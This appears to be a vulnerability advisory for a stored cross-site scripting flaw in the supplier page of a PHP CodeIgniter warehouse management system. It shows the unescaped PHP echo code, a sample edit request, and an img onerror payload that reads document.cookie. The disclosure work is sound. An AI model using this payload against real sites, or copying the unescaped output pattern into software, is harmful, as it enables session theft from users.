Warehouse Management System Store XSS on (supplier.php) 

```
/ci_wms/application/views/admin/content/website/supplier.php
```

Vendor Homepage:

```
https://www.sourcecodester.com/php-codeigniter-warehouse-management-system-free-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/ci_wms/application/views/admin/content/website/supplier.php
```

The potential risk of Cross-Site Scripting (XSS) arises because the values of the `$nama_supplier` and `$alamat_supplier` and`$notelp_supplier`variables are directly inserted into the `value` attribute of HTML input fields without undergoing HTML entity encoding. This means that if these variables contain malicious JavaScript code,  this code will be executed by the browser when the page loads.

```
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Supplier Name</label>
                                <input type="text" value="<?php echo $nama_supplier; ?>" class="form-control input-sm" id="nama_supplier" name="nama_supplier" placeholder="Supplier Name"
                                    required/>
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Address</label>
                                <input type="text" value="<?php echo $alamat_supplier; ?>" class="form-control input-sm" id="alamat_supplier" name="alamat_supplier"
                                    placeholder="Address" required/>
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Telephone Number</label>
                                <input type="text" value="<?php echo $notelp_supplier; ?>" class="form-control input-sm" id="notelp_supplier" name="notelp_supplier"
                                    placeholder="Telephone Number" required/>
                            </div>
```

Proof of vulnerability:

Request:

```
POST /ci_wms/website/supplier/edit/4 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_wms/website/supplier/edit/4
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; sessions=ajqpsdpib7m3hjjdrk9ftdh9ucbh14r2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

id_supplier=4&nama_supplier=Avant+Suppliers&alamat_supplier=440+Enim+St&notelp_supplier=04550010&simpan=Update+Data
```

payload

```
<img src=x onerRor=alert(document.cookie)>
```
<img width="1340" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/59b9c313-d7e2-4393-9ed0-8a171a8d9b54">

<img width="689" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/a46fc384-b7a3-495c-8642-00402bad4ce8">

<img width="1301" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/479601d4-7b3e-4522-9c8d-57695c78f984">


